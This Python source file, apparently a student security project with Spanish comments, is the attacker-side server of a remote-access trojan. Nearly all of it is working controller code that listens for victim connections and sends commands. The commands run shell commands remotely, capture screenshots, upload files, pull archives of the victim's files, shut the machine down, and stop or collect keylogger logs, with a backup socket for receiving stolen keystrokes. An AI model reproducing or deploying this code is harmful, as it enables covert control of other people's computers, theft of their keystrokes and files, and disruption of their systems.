""" 
PROYECTO SEGURIDAD INFORMATICA

REVERSE SHELL PYTHON
SERVIDOR (ATACANTE)

"""
# se importan las librerias a utilizar
import socket, os , time, sys, platform
from menuComandos import menuComandos
from zipfile import ZipFile

class Servidor: #se define la clase Servidor
    def __init__(self, ip, port, buffer_size): # definimos nuestro constructor que nos permitira iniciar los atributos de la clase
        self.IP = "192.168.1.5" # IP atacante
        self.PORT = 4444   # Puerto atacar
        self.BACKUP_PORT = 8080 # bacakup de puerto para restablecer conexion
        self.BUFFER_SIZE = buffer_size # Para controlar  el buffer de lectura, para evitar muchas llamadas de lecturas
        self.connections = [] # lista de conexiones
        self.info = "" # informacion sobre el objetivo(victima)
        self.recvcounter = 0 # contador de archivos recibidos
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # conexion socket para la interaccion de las maquinas

    def startServidor(self): # Iniciar el servidor
        self.server.bind((self.IP, self.PORT)) # puntero para la ip y el puerto de la conexion del servidor
        self.server.listen(1) # puntero para escuchar una conexion
        self.acceptConnections() # puntero para aceptar conexion

    def acceptConnections(self): # aceptar conexiones
        print("*** Escuchando conexiones entrantes ***") # imprime este mensaje
        self.client_socket, self.address = self.server.accept() # se mencionan los punteros al server accept
        print(f"*** Conexíon desde {self.address} ha sido establecida! ***") # mensaje de conexion exitosa
        self.connections.append(self.client_socket)
        self.choose()
    
    def checkConnection(self):
        """ Comprueba periódicamente si el cliente está activo enviando datos aleatorios """
        try:
            self.client_socket.send("#".encode("utf-8"))
            time.sleep(0.1) # dormir 0.1 segundo para evitar la congestión de datos
            return True
        except Exception:
            """ Destino desconectado porque no ha respondido al mensaje """

            print(f"[!] {self.address[0]} desconectado") # mensaje si se desconecta la conexion
            self.client_socket.close() # cierra la conexion

            return False

    def closeConnection(self): # funcion cerrar conexion 
        self.connections.remove(self.client_socket) # puntero para remover el socket cliente
        self.client_socket.close() # puntero para cerrar el socket del cliente
        self.server.close() # puntero para cerrar la conexion del server
    
    def choose(self):
        """ Main Menu """

        flag = False # bandera, para evitar verificar si la conexión está activa, si es falso, verifique de lo contrario no
        while True:
            if flag == False:
                if self.checkConnection() == False:
                    """ El cliente está inactivo, intentando recibir datos de respaldo (logs) """

                    try:
                        self.backupConnection() # ejecuta la funcion backupConection
                    except KeyboardInterrupt:
                        print("\n[ DEJADO DE RECIBIR DATOS ]")
                    except:
                        print("[!] El cliente cerró el proceso de copia de seguridad. El esta sobre ti!")
                    break
            else:
                # la bandera es verdadera, por lo que se omite la verificación y se restablece la bandera a falsa
                flag = False

            menuComandos() # se llama la funcion menuComandos de la libreria importada (imprime el menu de comandos)
            """ CONDICION PARA LOS COMANDOS """
            i = input() # permite obtener texto escrito por teclado y lo captura en la variable i
            
            # Comando Shell para poder acceder a la maquina y ejecutar los comandos y navegar por las rutas
            if i == 'shell': # si la variable i es igual a shell ejecuta la funcion
                try:
                    self.reverseShell() # ejecuata la funcion reverseShell
                    os.system("clear") #Esta linea de código hará que nuestra pantalla se limpie #Unix/Linux/MacOS/BSD
                except ConnectionResetError:
                    """ si el objetivo cierra la conexión, recibiremos solo un paquete RST (TCP), por lo que aquí cerramos la conexión de forma segura """
                    
                    self.closeConnection() # no estamos rompiendo porque existe la función de respaldo al principio del ciclo, solo para evitar la repetición de líneas de código. Obviamente, checkConnection devolverá falso
                except:
                    print("[!] Algo salió mal.")

            elif i == 'info': # Comando para mostrar la informacion de la maquina victima
                try:
                    self.info = self.getTargetInfo() # ejecuta la funciona informacion de la maquina victima
                    print("*** Hecho con exito ***")
                except ConnectionResetError:
                    self.closeConnection() # Lo mismo aquí y así sucesivamente en el código
                except:
                    print("[!] Algo salió mal.") # mensaje si algo sale mal en la ejecucion del comando

            elif i == 'shutdown': # Comando para apagar la maquina victima
                try:
                    self.shutdownTarget() # ejecuta la funcion si se cumple la condicio
                except:
                    print("[!] Algo salió mal.") # si no se cumple, mensaje algo salio mal

            elif i == 'close': #comando cerrar coxion
                try:
                    self.disconnectTarget() #si cumple la condicion, ejecuta la funcion
                except:
                    print("[!] Algo salió mal.") # si no se cumple, mensaje algo salio mal

                while True:
                    fireup = input("*** ¿Quieres volver a iniciar el modo escucha? [y/n]?")
                    """ condicion restablecer una nueva conexion """
                    if fireup == "y":
                        self.info = "" # información clara sobre el objetivo
                        self.connections.remove(self.client_socket) # elimina la conexión anterior

                        try:
                            """ Obtener datos de respaldo """
                            self.backupConnection() # ejecuta la funcion backupConection
                        except KeyboardInterrupt:
                            print("\n[ DEJADO DE RECIBIR DATOS ]")

                        self.acceptConnections()
                    elif fireup == "n": #si elige no la conexion se cierra
                        self.server.close()
                        break
                    else: # si dijita algo distinto de las opciones, manda el siguiente mensaje
                        print("[!] Elección no válida, vuelva a intentarlo.")

                try:
                    self.backupConnection() # ejecuta la funcion backupConection
                except KeyboardInterrupt:
                    print("\n[ DEJADO DE RECIBIR DATOS ]")
                except:
                    print("[!] El cliente cerró el proceso de copia de seguridad. ¡Está sobre ti!")

                break

            elif i == 'screenshot': # condicion para el Comando  tomar el capture
                try:
                    self.takeScreenshot() # si la condicion se cumple ejecuta la funcion
                except ConnectionResetError:
                    self.closeConnection() # no estamos rompiendo porque existe la función de respaldo al principio del ciclo, solo para evitar la repetición de líneas de código. Obviamente, checkConnection devolverá falso
                except:
                    print("[!] Algo salió mal.") # imprime el mensaje algo salio mal

            elif i == 'upload': # condicion para el Comando  subir archivo
                try:
                    self.uploadFile() #si la condicion se cumple ejecuta la funcion
                except:
                    print("[!] Algo salió mal.")# imprime el mensaje algo salio mal

            elif  i == 'download': # condicion para el Comando  descargar
                try:
                    self.downloadFiles() #si la condicion se cumple ejecuta la funcion
                except ConnectionResetError:
                    self.closeConnection()
                except:
                    print("[!] Algo salió mal")# imprime el mensaje algo salio mal
            
            elif i == 'stop':
                try:
                    self.stopKeyLogger()
                except ConnectionResetError:
                    self.closeConnection()

            elif i == 'getlogs':
                try:
                    self.getKeyLogs()
                except ConnectionResetError:
                    self.closeConnection()
                except:
                    print("[!] Algo salió mal")
            
            elif i == 'esc': # Comando  esc para salir
                self.server.close() 
                sys.exit()
            else:
                print("[!] Elección no válida, vuelva a intentarlo.")
                flag = True  # skip checking connection

        sys.exit()

    # se intenta actualizar el búfer con el tamaño de recepción
    def updateBuffer(self, size): # se define la funcion actualizar Buffer
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit(): # El isdigit()método devuelve True si todos los caracteres son dígitos; de lo contrario, False.
                buff += size[counter] # suma a la varible del lado izquierdo el valor del lado derecho

        return int(buff)

    #para archivos más grandes que el búfer
    def saveBigFile(self, size, buff): # funcion para los archivos mas grandes que el buffer
        full = b''
        while True:
            if sys.getsizeof(full) >= size: #si lo bytes ocupados por el objeto en memoria es mayor o igual que el buffer de memoria sale del ciclo
                break

            recvfile = self.client_socket.recv(buff)

            full += recvfile # suma a la varible del lado izquierdo el valor del lado derecho

        return full # retorna el achivo

    def getTargetInfo(self): # funcion para obtener informacion de la maquina de la victima
        command = "info" # comando info
        self.client_socket.send(command.encode("utf-8")) # codifica la cadena de caracteres del comando

        info = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8") # se captura el tamaño de bytes y se decodifica
        more = self.client_socket.recv(self.BUFFER_SIZE) # se captura el tamaño de bytes

        """ escribe información adicional de la maquina en un archivo llamado info.txt """

        with open('../receivedfile/info.txt', 'wb+') as f: # crear el directorio receivedfile y dentro de el el archivos info.txt
            f.write(more) #escribe dentro del archivo txt

        print("\n# OS:" + info) # imprime el sistema operativo de la maquina victima dentro del archivo info.txt
        print("# IP:" + self.address[0]) # imprime la ip de la maquina victima dentro del archivo info.txt
        print("*** Revisa el archivo info.txt para mas detalles de la maquina victima ***")

        return info
    
    def shutdownTarget(self): # Funcion para apagar la maquina de la victima
        command = ""
        # condicion de los comandos dependiendo que sistema operativo es windows / Linux
        if self.info == "win32": # si la maquina es windows
            command = "shutdown /s" # comando para apagar la maquina windows
            self.client_socket.send(command.encode("utf-8"))

            self.client_socket.close() # cierra la conexion
            print(f"[!] {self.address[0]} ha sido apagado") # imprime la ip de la maquina, y confirma que la maquina ha sido apagada
        elif self.info == "linux": # si la maquina es linux
            command = "shutdown -h now" # comando para apagar la maquina Linux
            self.client_socket.send(command.encode("utf-8"))

            self.client_socket.close() # cierra la conexion
            print(f"[!] {self.address[0]} ha sido apagado") # imprime la ip de la maquina, y confirma que la maquina ha sido apagada
        else:
            print("[!] No se conoce el comando de apagado.")
            print("*** Intente obtener más información sobre el objetivo(victima) ***")

    def disconnectTarget(self): # Funcion para desconectar la conexion
        command = "esc" # comando esc

        self.client_socket.send(command.encode("utf-8")) # codifica la cadena de caracteres del comando
        print("*** Killed")

    def takeScreenshot(self): #Funcion para tomar captura
        command = "takescreen" # Comando 
        self.client_socket.send(command.encode("utf-8")) # codifica la cadena de caracteres del comando

        # tamaño de archivo recibido
        recvsize = self.client_socket.recv(self.BUFFER_SIZE)
        size = recvsize.decode("utf-8") # decodifica el tamaño del archivo
        time.sleep(0.1) # dormir 0.1 segundo para evitar la congestión de datos

        # búfer de actualización
        buff = self.updateBuffer(size)

        # obteniendo el archivo
        print("*** Captura de pantalla guardada ***")
        fullscreen = self.saveBigFile(int(size), buff) #toma el captura de pantalla y lo guarda en el buffer

        # guardando el archivo
        with open(f'../receivedfile/{time.time()}.png', 'wb+') as screen: # guarda la captura de pantalla en la ruta con el formato PNG
            screen.write(fullscreen)

        print("*** Archivo guardado ***") # imprime el mensaje archivo guardado

    def uploadFile(self): #funcion para cargar archivo
        while True:
            try:
                path = input("[+] Ingrese la ruta del archivo")

                if not os.path.exists(path): #condicion para cuando el archivo no exista
                    raise FileNotFoundError
                else:
                    break
            except FileNotFoundError:
                print("[!] Archivo no encontrado, vuelva a intentarlo") #mensaje de error cuando no existe el archivo

        command = "recv" #comando para el shell
        self.client_socket.send(command.encode("utf-8")) # codifica la cadena de caracteres del comando

        name = input("[+] Guardar para la víctima como: ") # nombre de archivo, debe incluir extensión
        self.client_socket.send(name.encode("utf-8"))  #codifica la cadena de caracteres del comando

        with open(path, 'rb') as f:
            # envío de tamaño de archivo
            fsize = os.path.getsize(path) #se verifica los bytes del objeto 
            size = str(fsize)
            self.client_socket.send(size.encode("utf-8"))
            time.sleep(0.1) # dormir 0.1 segundo para evitar la congestión de datos

            # enviando archivo
            print("*** Enviando Archivo ***")
            sfile = f.read() #se carga
            self.client_socket.send(sfile) #se enviar el archivo

        print("*** Archivo Enviado ***") # mensaje archivo enviado

    def downloadFiles(self): #funcion Descargar archivos
        command = "download" #comando para descargar
        self.client_socket.send(command.encode("utf-8")) #codifica la cadena de caracteres del comando

        path = input("[+] Ingrese la ruta (NO ES UN SOLO ARCHIVO): ") # se captura la ruta en la variable path
        self.client_socket.send(path.encode("utf-8")) # codifica la cadena de caracteres
        response = self.client_socket.recv(self.BUFFER_SIZE)
        if response.decode("utf-8") == "OK": # condición si es ok se toma el tamaño en bytes el archivo
            # tamaño de recepción
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8") # se captura el tamaño de bytes y se decodifica
            time.sleep(0.1) # dormir 0.1 segundo para evitar la congestión de datos

            if int(size) <= self.BUFFER_SIZE: #condicion para el tamaño del archivo menor igual con el buffer de memoria
                # archivo recv
                archive = self.client_socket.recv(self.BUFFER_SIZE) # se captura el archivo en la varible archive
                print("*** Archivo obtenido ***") # mensaje archivo obtenido

                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output: # se guarda el archivo en la ruta de la carpeta receivedfile los archivos seran.ZIP
                    output.write(archive) # entrada 

                print("*** Archivo guardado ***") #mensaje archivo guardado
                self.recvcounter += 1 # suma a la varible del lado izquierdo el valor del lado derecho

            else:
                # si el tamaño del archivo es mayor al buffer
                # actualizacion del buffer
                buff = self.updateBuffer(size) # se actualiza el tamaño del buffer

                # archivo reciv
                fullarchive = self.saveBigFile(int(size), buff) # se guarda el archivo con su respectivo tamaño

                print("*** Tengo el archivo *** ")
                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output: # se guarda el archivo en la ruta como .zip
                    output.write(fullarchive)

                print("*** Archivo Guardado ***") #mensaje archivo guardado
                self.recvcounter += 1 # suma a la varible del lado izquierdo el valor del lado derecho
        else:
            print(response.decode("utf-8")) # se decodifica

    def stopKeyLogger(self): #funcion para detener el keylogger
        command = "stop"
        self.client_socket.send(command.encode("utf-8")) # codifica el comando enviado

        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8") # se captura el tamaño de bytes y se decodifica
        print(response)

    def getKeyLogs(self): # funcion para recibir el log del keylogger
        """ Recibir los archivos del keylogger """

        command = "getlogs" #comando para recibir los archivos del keylogger
        self.client_socket.send(command.encode("utf-8"))

        flag = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8") # # se captura el tamaño de bytes y se decodifica
        if flag == "[OK]": # condicion si es exitoso la ejecucion del comando
            # tamaño recibido
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8") # # se captura el tamaño de bytes y se decodifica en la variable size
            time.sleep(0.1) # dormir 0.1 segundo para evitar la congestión de datos

            if int(size) <= self.BUFFER_SIZE: # condicion para el tamaño del archivo menor igual con el buffer de memoria
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE) # se almacena el archivo recibido del buffer de memoria
                print("*** Registro Obtenido ***") # mensaje si se obtiene el registro del keylogger

                with open('../receivedfile/keylogs.zip', 'wb+') as output: # abre el directorio y se guarda el archivo como .zip y se asigna un alias  salida
                    output.write(archive) # escribe la salida sobre la varible que almacena el archivo recibido del buffer

                print("*** Registro Guardado ***")

            else: # si es mayor  el tamaño del archivo al buffer de memoria
                # Actualizar el buffer de memoria
                buff = self.updateBuffer(size) # actualiza el tamaño del buffer de memoria en la bariable buff

                # ARrchivo recibido
                fullarchive = self.saveBigFile(int(size), buff) # la variable fullarchive almacena el archivo recibido el tamaño y el buffer

                print("*** Registro obtenido ***") # mensaje despues de obtner el archivo
                with open('../receivedfile/keylogs.zip', 'wb+') as output: # abre el directorio y se guarda el archivo como .zip y se asigna un alias  salida
                    output.write(fullarchive)

                print("*** Registro Guardado***")
        else:
            print("[!] Error, no hay registro existente!") # si no hay un registro almacenado manda el siguiente msj de error

    def reverseShell(self): # funcion shell
        """ Este no es un shell interactivo real, obtienes el resultado
         del comando pero no puedes interactuar con él """

        print("[!] back para salir del shell")
        while True:
            command = input(f"[{self.address[0]}]$ ") # antes del comando se imprimira la ip de la victima

            if not command: #condicion si no tiene comando
                print("[!] No se puede enviar un comando vacío.") # mensaje No se puede enviar un comando vacío
                continue # continua para el siguiente comando

            if command.lower() == "back": # comando back para salir del shell
                break # detener

            self.client_socket.send(command.encode("utf-8")) # se codifica el comando

            output = self.client_socket.recv(self.BUFFER_SIZE) # se verifica el los bytes del comando con el buffer

            if not output: # condicio si no
                self.connections.remove(self.client_socket) # se remueve la conexion con la victima
                self.client_socket.close() # cierra la conexion del cliente
                self.server.close() # cierra el servidor
                break # se detiene

            print(output.decode("utf-8")) # imprime la salida decodificada

    def backupConnection(self): # funcion backup de la conexion
        """ Crear un nuevo socket para recibir los archivos del registrador de claves en caso de que la conexión principal
             se corte """

        while True:
            print("*** Intentando recibir registros de keylogger... ***")

            newserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # nueva conexion socket
            newserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            newserver.bind((self.IP, self.BACKUP_PORT)) # utiliza la misma ip, pero con el puerto del backup
            newserver.listen(1) # escucha una conexion
            newserver.settimeout(60) # para evitar quedar atrapado en un bucle si la función de respaldo también se elimina
            try:
                clientbackup, addr = newserver.accept()
            except socket.timeout: # si agota el tiempo de la conexion
                print("*** Se agotó el tiempo de espera de la conexión, la función de respaldo se ha cerrado. Están sobre ti! ***")
                break # se detiene

            # tamaño de recepción
            size = clientbackup.recv(self.BUFFER_SIZE).decode("utf-8") # se almacena  el backup del cliente decodificado
            time.sleep(0.1) # dormir 0.1 segundos

            if int(size) <= self.BUFFER_SIZE: # condicion si el tamaño es menor igual al buffer de memoria
                # recepcion del archivo
                logs = clientbackup.recv(self.BUFFER_SIZE)

                with open(f'../receivedfile/backup.zip', 'wb+') as output: # abre el directorio y crea el archivo backup.zip
                    output.write(logs)

                print("*** Archivos de keylogger guardados en esta máquina. ***") # mendaje al guardar los archivos del keylogger

                clientbackup.close() # cierra la conexion del cliente backup
                newserver.close() # cierra la nueva conexion server
                break # detiene

            else: #condicion si el buffer de memoria es mayor actualiza el buffer y recive el archivo
                # Actualizacion del buffer
                buff = self.updateBuffer(size)

                # recepcion del archivo
                full = b'' 
                while True:
                    if sys.getsizeof(full) >= int(size): #si lo bytes ocupados por el objeto en memoria es mayor o igual que el buffer de memoria sale del ciclo
                        break # detiene

                    recvfile = clientbackup.recv(buff) # varible recibe la actualizacion el buffer de moria

                    full += recvfile # suma a la varible del lado izquierdo el valor del lado derecho

                with open(f'../receivedfile/backup.zip', 'wb+') as output: # salida y se guarda el bakup.zip en la ruta de la carpeta
                    output.write(full)

                print("*** Archivos de keylogger guardados en esta máquina. ***") # mensaje de archivos guardados

                clientbackup.close() # cierra la conexion backup cliente
                newserver.close() # cierra la nueva conexion con el server
                break
def main(): # se define el main, donde creará los direcctorios cada vez que se ejecute el exploit
    """ Creando los directorios necesarios """
    try:
        os.mkdir('../receivedfile') # se crea el directorio receivedfile
    except FileExistsError:
        pass
    #banner()
    time.sleep(1) # se duerme un segundo para evitar congestion de datos

    HOSTNAME = socket.gethostname()
    IP = socket.gethostbyname(HOSTNAME)
    PORT = int(input("[+] Escuche en el puerto> ")) # la variable captura el puerto que se dijita
    BUFFERSIZE = 2048 # varibale para el tamaño del buffer de memoria
    server = Servidor(IP, PORT, BUFFERSIZE) # variable que permite conexion del servidor con la ip, puerto y el tamaño del buffer de memoria
    try:
        server.startServidor() # ejecuta el inicio del servidor (conexion)
    except Exception as e: # condicion si existe un proble al iniciar el servidor 
        print("*** Error al iniciar el servidor:", str(e) + " ***") # mensaje de error

if __name__ == "__main__": # condicion para ejecutar el main
    main()
    
